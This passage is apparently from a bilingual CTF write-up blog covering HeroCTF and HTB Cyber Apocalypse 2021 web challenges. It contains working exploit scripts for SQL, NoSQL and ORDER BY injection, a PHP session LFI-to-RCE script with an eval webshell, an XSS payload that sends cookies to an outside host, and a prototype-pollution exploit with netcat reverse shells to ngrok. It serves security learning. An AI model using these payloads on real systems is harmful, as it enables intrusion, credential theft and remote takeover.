PDO::CURSOR_FWDONLY));</span><br><span class="line">    $sth-&gt;execute(<span class="keyword">array</span>(<span class="string">&#x27;:username&#x27;</span> =&gt; $username, <span class="string">&#x27;:password&#x27;</span> =&gt; $password));</span><br><span class="line">    $users = $sth-&gt;fetchAll();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count($users) === <span class="number">1</span>) &#123;</span><br><span class="line">        $msg = <span class="string">&#x27;Welcome back admin ! Here is your flag : &#x27;</span> . FLAG;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&#x27;Wrong username or password.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;admin&amp;password&#x3D;%%</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="PwnQL-2"><a href="#PwnQL-2" class="headerlink" title="PwnQL #2"></a>PwnQL #2</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits+<span class="string">&#x27;-+$~`^#.@_,&#123;&#125;()&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://chall1.heroctf.fr:8080/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    result = flag</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = flag+j+<span class="string">&#x27;%&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span> : <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : payload</span><br><span class="line">        &#125;</span><br><span class="line">        print(j)</span><br><span class="line">        print(data)</span><br><span class="line">        r =requests.post(url = url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hero&#123;pwnQL_b4sic_0ne_129835&#125;&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == result:</span><br><span class="line">        print(<span class="string">&quot;over&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="hackbox-wp"><a href="#hackbox-wp" class="headerlink" title="hackbox wp"></a>hackbox wp</h1><p><code>https://albertofdr.github.io/ctf/htb/en/2021/04/24/ctf-htb.html#emoji-voting</code></p>
+<h1 id="WildGooseHunt"><a href="#WildGooseHunt" class="headerlink" title="WildGooseHunt"></a>WildGooseHunt</h1><p>wp </p>
+<p>之前看了没太看懂！ 现在看了看 mangodb后稍微看懂了点！</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210425144302.png" alt="image-20210425144302880"></p>
+<p>哦！ 知道了！ 学到精髓了！ nosql的注入的 精髓是 运算符！</p>
+<p><code>https://maizitoday.github.io/post/mongodb%E7%B3%BB%E5%88%97-%E8%BF%90%E7%AE%97%E7%AC%A6/</code></p>
+<table>
+<thead>
+<tr>
+<th><a target="_blank" rel="noopener" href="https://docs.mongodb.com/manual/reference/operator/query/eq/#op._S_eq"><code>$eq</code></a></th>
+<th>匹配等于指定值的值。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://docs.mongodb.com/manual/reference/operator/query/regex/#op._S_regex"><code>$regex</code></a></td>
+<td>选择值与指定正则表达式匹配的文档。</td>
+</tr>
+</tbody></table>
+<p>就是 nosql注入 最后 在mangodb 里 变成了！ 条件判断了！  这样就达成了sql注入！ </p>
+<h2 id="nosql-注入"><a href="#nosql-注入" class="headerlink" title="nosql 注入"></a>nosql 注入</h2><p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/WildGooseHuntIntro.png" alt="img"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/WildGooseHuntProblem.png" alt="img"></p>
+<p>In this case, the problem was a NoSQL injection in the following code. The objective of the challenge was to retrieve the password (flag) of the user “admin”. So in this case, I start using the well-known repository [PayloadAllTheThings](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL</a> Injection).</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/WildGooseHunt1.png" alt="img"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/WildGooseHunt2.png" alt="img"></p>
+<p>Finally I crafted a python script to automatically retrieve the flag/pass of the “admin” user. Script:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">password=<span class="string">&quot;CHTB&#123;&quot;</span></span><br><span class="line">u=<span class="string">&quot;http://URL:PORT/api/login&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;|&#x27;</span>]:</span><br><span class="line">            payload=<span class="string">&#x27;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;%s&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^%s&quot; &#125;&#125;&#x27;</span> % (username, password + c)</span><br><span class="line">            r = requests.post(u, data = payload, headers = headers, verify = <span class="literal">False</span>, allow_redirects = <span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Successful&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                print(<span class="string">&quot;Found one more char : %s&quot;</span> % (password+c))</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure>
+
+<p>In the following screenshot we can see the script running. Also the final flag was <code>CHTB&#123;1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3&#125;</code>.</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/WildGooseHunt3.png" alt="img"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">URL=<span class="string">&quot;http://138.68.168.137:32634&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_admin_password</span>():</span></span><br><span class="line">    password=<span class="string">&quot;&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;</span>&#125;</span><br><span class="line">    print(<span class="string">&quot;Starting...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>): <span class="comment">#maximun password lenth = 100</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">&#x27;&#123;_&#125;&#x27;</span>:</span><br><span class="line">            payload=<span class="string">f&quot;username=admin&amp;password[$regex]=^<span class="subst">&#123;password&#125;</span><span class="subst">&#123;c&#125;</span>&quot;</span></span><br><span class="line">            print(payload)</span><br><span class="line">            r = requests.post(URL + <span class="string">&quot;/api/login&quot;</span>, data=payload, headers=headers)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Successful&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                password+=c</span><br><span class="line">                print(password)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> password:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">guess_admin_password()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Emoji-Voting"><a href="#Emoji-Voting" class="headerlink" title="Emoji Voting"></a>Emoji Voting</h1><h2 id="sqllite注入-orderby注入"><a href="#sqllite注入-orderby注入" class="headerlink" title="sqllite注入 orderby注入"></a>sqllite注入 orderby注入</h2><p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/EmojiVotingIntro.png" alt="img"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/EmojiVotingProblem.png" alt="img"></p>
+<p>In this case, the challenge was to exploit a SQL Injection in the database. In the following screenshot we can see that first we need to extract the table in which is saved the flag because the name is created with the function rand. Furthermore, we need to add the SQL Injection in the next query: <code>UPDATE emojis SET count = count + 1 WHERE id = OURINJECTION</code>. In order to retrieve the flag I used this <a target="_blank" rel="noopener" href="https://portswigger.net/support/sql-injection-in-the-query-structure">blog</a>. Also, after some queries I realised that I required to change the keywords to <a target="_blank" rel="noopener" href="https://sqlite.org/schematab.html">sqlite schema</a>.</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/EmojiVoting1.png" alt="img"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/EmojiVoting2.png" alt="img"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/EmojiVoting3.png" alt="img"></p>
+<p>Finally, after a bunch of manual queries, I wrote the following script:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://URL:PORT/api/list&quot;</span></span><br><span class="line">ch = ord(<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;count DESC&quot;</span> <span class="comment"># NORMAL</span></span><br><span class="line">payload = <span class="string">&quot;(CASE WHEN(SELECT UNICODE(SUBSTR(name,1,1)) FROM emojis WHERE id=&#x27;1&#x27;)=97 THEN count ELSE name END) ASC&quot;</span> <span class="comment"># WORKS</span></span><br><span class="line">payload = <span class="string">&quot;(CASE WHEN(SELECT UNICODE(SUBSTR(name,1,1)) FROM sqlite_master WHERE type=&#x27;table&#x27; LIMIT 1 OFFSET 0)=&quot;</span> + str(ch) + <span class="string">&quot; THEN count ELSE name END) ASC&quot;</span></span><br><span class="line">complete = <span class="string">&quot;SELECT * FROM emojis ORDER BY &quot;</span> + payload</span><br><span class="line">parameter = &#123;<span class="string">&#x27;order&#x27;</span>: payload&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># One case</span></span><br><span class="line"><span class="comment"># Reference: https://portswigger.net/support/sql-injection-in-the-query-structure</span></span><br><span class="line"><span class="comment"># SQLite schema: https://sqlite.org/schematab.html</span></span><br><span class="line"><span class="comment">#print(&quot;[*] Payload: \n\t&quot; + payload)</span></span><br><span class="line"><span class="comment">#print(&quot;[*] SQL: \n\t&quot; + complete)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#r = requests.post(URL, data = parameter)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#print(&quot;[*] Response: \n\t&quot; + r.text)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#if &quot;1&quot; in r.text[7]:</span></span><br><span class="line"><span class="comment">#    print(&quot;[*] False&quot;)</span></span><br><span class="line"><span class="comment">#if &quot;3&quot; in r.text[7]:</span></span><br><span class="line"><span class="comment">#    print(&quot;[*] True&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Return the table flag_XXXXXXXXXX (hex)</span></span><br><span class="line"><span class="comment"># Know it because if yo use node:</span></span><br><span class="line"><span class="comment"># const crypto = require(&#x27;crypto&#x27;);</span></span><br><span class="line"><span class="comment"># rand = crypto.randomBytes(5).toString(&#x27;hex&#x27;); console.log(rand.length)</span></span><br><span class="line"><span class="comment">#l = string.hexdigits</span></span><br><span class="line"><span class="comment">#flag = &quot;flag_&quot;</span></span><br><span class="line"><span class="comment">#for i in range(5,17):</span></span><br><span class="line"><span class="comment">#    for ch in l:</span></span><br><span class="line"><span class="comment">#        ch = ord(ch)</span></span><br><span class="line"><span class="comment">#        payload = &quot;(CASE WHEN(SELECT UNICODE(SUBSTR(name,&quot;+str(i)+&quot;,&quot;+str(i)+&quot;)) FROM sqlite_master WHERE type=&#x27;table&#x27; LIMIT 1 OFFSET 0)=&quot; + str(ch) + &quot; THEN count ELSE name END) ASC&quot;</span></span><br><span class="line"><span class="comment">#        parameter = &#123;&#x27;order&#x27;: payload&#125;</span></span><br><span class="line"><span class="comment">#        r = requests.post(URL, data = parameter)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#        if &quot;3&quot; in r.text[7]:</span></span><br><span class="line"><span class="comment">#            flag += chr(ch)</span></span><br><span class="line"><span class="comment">#            print(&quot;[*] Flag table: &quot; + str(flag))</span></span><br><span class="line"><span class="comment">#            break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Table: flag_a41b3a6179</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Return the flag</span></span><br><span class="line">l = string.ascii_letters + string.digits + <span class="string">&quot;!\&quot; #$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125; ~.&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">70</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> l:</span><br><span class="line">        ch = ord(ch)</span><br><span class="line">        payload = <span class="string">&quot;(CASE WHEN(SELECT UNICODE(SUBSTR(flag,&quot;</span>+str(i)+<span class="string">&quot;,&quot;</span>+str(i)+<span class="string">&quot;)) FROM flag_a41b3a6179 LIMIT 1 OFFSET 0)=&quot;</span> + str(ch) + <span class="string">&quot; THEN count ELSE name END) ASC&quot;</span></span><br><span class="line">        parameter = &#123;<span class="string">&#x27;order&#x27;</span>: payload&#125;</span><br><span class="line">        r = requests.post(URL, data = parameter)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;3&quot;</span> <span class="keyword">in</span> r.text[<span class="number">7</span>]:</span><br><span class="line">            flag += chr(ch)</span><br><span class="line">            print(<span class="string">&quot;[*] Flag: &quot;</span> + str(flag))</span><br><span class="line">            <span class="keyword">break</span> </span><br></pre></td></tr></table></figure>
+
+<p>I included some screenshots of the script running. Finally the flag was <code>CHTB&#123;order_me_this_juicy_info&#125;</code>.</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/EmojiVoting4.png" alt="img"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210425143419.png" alt="img"></p>
+<h1 id="Bug-Report"><a href="#Bug-Report" class="headerlink" title="Bug Report"></a>Bug Report</h1><h2 id="xss盗取cookie"><a href="#xss盗取cookie" class="headerlink" title="xss盗取cookie"></a>xss盗取cookie</h2><p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/BugReportIntro.png" alt="img"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/BugReportProblem.png" alt="img"></p>
+<p>In this challenge an XSS was required in order to retrive the cookie from the bot. After beeing thinking around the challenge for a while, I found out the cookie was only setted for the localhost (doc) like we see in the following screenshot showing the code.</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/BugReport1.png" alt="img"></p>
+<p>After some proves and thinking how to trigger XSS in the bot to retrieve the cookie (flag), I found that adding in the url the payload worked like you could see in the next screenshot. So finally, the payload was:</p>
+<p><code>http://127.0.0.1:1337/&lt;script&gt;window.location=&quot;http://NGROKURL/&quot;.concat(document.cookie);&lt;/script&gt;</code>.</p>
+<p>The flag was: <code>CHTB&#123;th1s_1s_my_bug_r3p0rt&#125;</code>.</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/BugReport2.png" alt="img"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/BugReport3.png" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:1337&#x2F;&lt;script&gt;window.location&#x3D;&quot;http:&#x2F;&#x2F;47.94.0.250:1&quot;.concat(document.cookie);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="IFI-RCE"><a href="#IFI-RCE" class="headerlink" title="IFI+RCE"></a>IFI+RCE</h1><p>session</p>
+<h2 id="session自动话脚本"><a href="#session自动话脚本" class="headerlink" title="session自动话脚本"></a>session自动话脚本</h2><p><code>https://www.aqniukt.com/article/253</code></p>
+<p> <code>*</code> 是当前  目录   操了！ </p>
+<p><code>/*</code> 是根目录<code>upload_progress_CHTB&#123;th4ts_4_w31rd_3xt0rt10n_@#$?&#125;</code>  <code>upload_progress_值</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/4/20 11:03</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : mrctf.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat *&#x27;);&quot;</span>&#125;</span><br><span class="line">poy = &#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:8081&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://138.68.168.137:32079&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://138.68.168.137:32079/?f=../../../../../../../../../../../../../tmp/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        print(resp.url)</span><br><span class="line">        <span class="comment"># print(resp.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="BlitzProp"><a href="#BlitzProp" class="headerlink" title="BlitzProp"></a>BlitzProp</h1><h2 id="AST注入-啥啊！"><a href="#AST注入-啥啊！" class="headerlink" title="AST注入   啥啊！"></a>AST注入   啥啊！</h2><p><code>https://blog.p6.is/AST-Injection/#Pug</code></p>
+<p><code>https://www.zhihu.com/question/33107553</code></p>
+<p><code>https://esprima.org/demo/parse.html#</code></p>
+<p>AST：</p>
+<p>抽象语法树（Abstract Syntax Tree）也称为AST语法树，指的是源代码语法所对应的树状结构。也就是说，对于一种具体编程语言下的源代码，通过构建语法树的形式将源代码中的语句映射到树中的每一个节点上。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210425152104.png" alt="img">litzProp</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/BlitzPropIntro.png" alt="img"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/BlitzPropProblem.png" alt="img"></p>
+<p>This challenge was pretty similar to the challenge “Gunship”(<a target="_blank" rel="noopener" href="https://www.nullsession.pw/htb-x-uni-ctf-2020-quals-write-up/">writeup</a>) of HTB University CTF 2020. This challenge was an AST injection described in this <a target="_blank" rel="noopener" href="https://blog.p6.is/AST-Injection/">blog</a>. To exploit this web, we first need to trigger the “unflatten” function with our payload and then the “pug.compile” function so that the server runs our payload. The vulnerable code of the challenge:</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://albertofdr.github.io/assets/postImages/htb-cyberapocalypse-2021-post/BlitzProp1.png" alt="img"></p>
+<p>My final exploit.py:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">TARGET\_URL = <span class="string">&#x27;http://URL:PORT&#x27;</span></span><br><span class="line"><span class="comment">#TARGET\_URL = &#x27;http://localhost:1337&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make pollution // Send Exploit</span></span><br><span class="line">a = requests.post(TARGET\_URL + <span class="string">&#x27;/api/submit&#x27;</span>, json = &#123;</span><br><span class="line">    <span class="string">&quot;__proto__.block&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Text&quot;</span>, </span><br><span class="line">        <span class="string">&quot;line&quot;</span>: <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/ash -i 2&gt;&amp;1|nc NGROKURL NGROKPORT &gt;/tmp/f`)&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># Trigger poll</span></span><br><span class="line">a = requests.post(TARGET\_URL + <span class="string">&#x27;/api/submit&#x27;</span>, json = &#123;</span><br><span class="line">        <span class="string">&quot;song.name&quot;</span>: <span class="string">&quot;Not Polluting with the boys&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># execute</span></span><br><span class="line">requests.get(TARGET_URL)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">       &quot;song.name&quot;: &quot;The Goose went wild&quot;, </span><br><span class="line">        &quot;__proto__.block&quot;:&#123;</span><br><span class="line">            &quot;type&quot;:&quot;Text&quot;,</span><br><span class="line">            &quot;line&quot;:&quot;process.mainModule.require(&#39;child_process&#39;).exec(&#39;nc 3.tcp.ngrok.io 11163 -e &#x2F;bin&#x2F;sh&#39;)&quot;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc 3.tcp.ngrok.io 11163 -e &#x2F;bin&#x2F;sh</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;ash -i 2&gt;&amp;1|nc NGROKURL NGROKPORT &gt;&#x2F;tmp&#x2F;f</span><br><span class="line">一样</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="CaaS-Solution"><a href="#CaaS-Solution" class="headerlink" title="CaaS Solution"></a>CaaS Solution</h1><p>curl 支持很多协议！ 皮 错了</p>
+<p>着个题和 file协议有关！ 知道file协议只能本地读取就可以了！ </p>
+<p><code>https://www.cnblogs.com/lishanlei/p/9327646.html</code></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210425160521.png" alt="image-20210425160521027"></p>
+<h2 id="浏览器通过file-访问文件和http-访问文件的区别"><a href="#浏览器通过file-访问文件和http-访问文件的区别" class="headerlink" title="浏览器通过file://访问文件和http://访问文件的区别"></a>浏览器通过file://访问文件和http://访问文件的区别</h2><p>file协议用于访问本地计算机中的文件，好比通过资源管理器中打开文件一样，需要主要的是它是针对本地的，即file协议是访问你本机的文件资源。</p>
+<p>http访问本地的html文件，相当于将本机作为了一台http服务器，然后通过localhost访问的是你自己电脑上的本地服务器，再通过http服务器去访问你本机的文件资源。</p>
+<p>再简单点就是file只是简单请求了本地文件，将其作为一个服务器未解析的静态文件打开。而http是在本地搭建了一个服务器再通过服务器去动态解析拿到文件。</p>
+<p>其他区别：</p>
+<p>file协议只能在本地访问</p>
+<p>本地搭建http服务器开放端口后他人也可以通过http访问到你电脑中的文件，但是file协议做不到</p>
+<p>file协议对应有一个类似http的远程访问，就是ftp协议，即文件传输协议。</p>
+<p>file协议无法实现跨域</p>
+<p>所以可以直接读取！</p>
+<h1 id="junior-jwt"><a href="#junior-jwt" class="headerlink" title="junior-jwt"></a>junior-jwt</h1><h2 id="jwt绕过-baby-web-jwt"><a href="#jwt绕过-baby-web-jwt" class="headerlink" title="jwt绕过 baby web jwt"></a>jwt绕过 <strong>baby</strong> <strong>web</strong> <strong>jwt</strong></h2><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>For creating the payload, we can use the website’s source code.</p>
+<p>We should just change the main function as below (changing role to <code>admin</code> and changing <code>RS256</code> to <code>HS256</code>):</p>
+<p>就是把非对称加密  变成对称加密</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    $publikKey  = <span class="string">&#x27;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEApPRW0nXMoQyN8GzVCHaW</span></span><br><span class="line"><span class="string">nWyq00omHh/o7AXEJvbpVBk5HTWLt+Zdj1aK1JFWU5lPeMSoXkf7WJiqoGgwVblX</span></span><br><span class="line"><span class="string">Rq2dSIIaNBFSjomS1Mcw1Tyx+q9Y6CPJGdwAMEMH5uKhGkgV9OrFQcHoozLAvzFl</span></span><br><span class="line"><span class="string">BneqmTO9+V1FKEuHWHItvdP1em7UiUnZ7JXb13L4IbZVGPNgDVf0GoButIlVo1+T</span></span><br><span class="line"><span class="string">pMZcBHNV0ndGZg0e6qTCp5m9yMWcH697Rt2FRN4fgJpYBknBs8UrAeCczRkk6037</span></span><br><span class="line"><span class="string">N+c4IM+St6KZNqg+4ZlRZC+V9zOBSTkrXXN/CXRUiIQMgmyit5zbEpN8PUY6VPzk</span></span><br><span class="line"><span 